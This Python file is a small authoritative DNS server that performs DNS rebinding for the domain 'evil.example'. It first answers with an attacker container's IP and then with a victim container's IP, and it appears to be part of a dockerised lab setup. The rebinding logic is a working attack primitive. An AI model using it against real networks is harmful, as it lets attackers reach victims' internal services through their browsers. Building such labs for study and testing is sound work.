#!/usr/bin/env python3
"""Minimal authoritative DNS server that implements the rebind primitive.

For the domain `evil.example`:
- The first N lookups return the attacker container's IP (172.28.0.20)
- Subsequent lookups return the victim container's IP (172.28.0.30)

The flip is per-source-IP so that healthchecks and the browser are not
correlated. TTL is set very low (1 second) to encourage the browser to
re-resolve quickly after the initial page load.

Every other query is answered with the docker compose service-name
resolution (fall back to forwarding upstream — handled by the OS resolver
when this container is used only for the rebind domain).

This is intentionally minimal: it implements just enough of the DNS
protocol to answer A queries for the rebind domain. It is NOT a
general-purpose DNS server.
"""

from __future__ import annotations

import socket
import struct
import sys
import threading
from collections import defaultdict

REBIND_DOMAIN = b"evil.example"
ATTACKER_IP = "172.28.0.20"
VICTIM_IP = "172.28.0.30"
TTL_SECONDS = 1
# Flip after the first N lookups for a given source IP (lets the page
# initially load from the attacker, then redirect post-TTL).
FLIP_AFTER_LOOKUPS = 1

# Per-source-IP lookup counters
_lookup_counts: dict[str, int] = defaultdict(int)
_lock = threading.Lock()


def _encode_name(name: bytes) -> bytes:
    """Encode a domain name in DNS wire format (length-prefixed labels)."""
    parts = name.split(b".")
    return b"".join(bytes([len(p)]) + p for p in parts) + b"\x00"


def _parse_name(data: bytes, offset: int) -> tuple[bytes, int]:
    """Parse a domain name from DNS wire format. Returns (name, new offset).

    Does not implement compression decoding for the response — we only
    need to parse the question section.
    """
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0:
            # Compression pointer — skip
            offset += 2
            break
        labels.append(data[offset + 1 : offset + 1 + length])
        offset += 1 + length
    return b".".join(labels), offset


def _build_response(query: bytes, source_ip: str) -> bytes:
    """Construct a DNS A response for the rebind domain (or NXDOMAIN otherwise)."""
    txn_id = query[0:2]
    # Parse the question
    qname, qend = _parse_name(query, 12)
    qtype, qclass = struct.unpack(">HH", query[qend : qend + 4])
    question_section = query[12 : qend + 4]

    is_rebind = qname.lower() == REBIND_DOMAIN

    if not is_rebind:
        # NXDOMAIN
        resp_flags = 0x8183  # standard query response, no error
        header = txn_id + struct.pack(">HHHHH", resp_flags, 1, 0, 0, 0)
        return header + question_section

    # Pick which IP to return based on per-source-IP lookup count
    with _lock:
        _lookup_counts[source_ip] += 1
        count = _lookup_counts[source_ip]
    target_ip = ATTACKER_IP if count <= FLIP_AFTER_LOOKUPS else VICTIM_IP

    print(
        f"[dns] {source_ip:>16}  lookup #{count} for {qname.decode()} → {target_ip}",
        flush=True,
    )

    # Build response: header + question + 1 answer
    resp_flags = 0x8180  # standard response, recursion available, no error
    header = txn_id + struct.pack(">HHHHH", resp_flags, 1, 1, 0, 0)

    # Answer: name (pointer to question), type A, class IN, TTL, RDLENGTH, RDATA
    name_ptr = struct.pack(">H", 0xC000 | 12)
    answer = (
        name_ptr
        + struct.pack(">HHIH", 1, 1, TTL_SECONDS, 4)  # type=A, class=IN, TTL, rdlength=4
        + socket.inet_aton(target_ip)
    )
    return header + question_section + answer


def serve_udp(host: str = "0.0.0.0", port: int = 53) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((host, port))
    except PermissionError:
        sys.stderr.write(f"need CAP_NET_BIND_SERVICE or root to bind UDP/{port}; aborting\n")
        sys.exit(2)
    print(f"[dns] UDP listener on {host}:{port}", flush=True)
    print(
        f"[dns] {REBIND_DOMAIN.decode()} → {ATTACKER_IP} (first {FLIP_AFTER_LOOKUPS} lookup) → {VICTIM_IP} (after)",
        flush=True,
    )
    while True:
        try:
            data, addr = sock.recvfrom(512)
            response = _build_response(data, addr[0])
            sock.sendto(response, addr)
        except Exception as e:  # noqa: BLE001
            print(f"[dns] error: {e}", flush=True)


if __name__ == "__main__":
    try:
        serve_udp()
    except KeyboardInterrupt:
        print("[dns] shutting down")
